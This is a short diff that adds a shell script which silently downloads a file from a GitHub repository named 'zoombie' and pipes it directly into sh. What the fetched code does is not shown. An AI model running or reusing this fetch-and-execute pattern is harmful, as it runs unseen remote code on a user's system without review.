@@ -1,0 +1,2 @@
+#!/bin/sh
+curl "https://raw.githubusercontent.com/DaBigBlob/zoombie/main/src" -s | sh
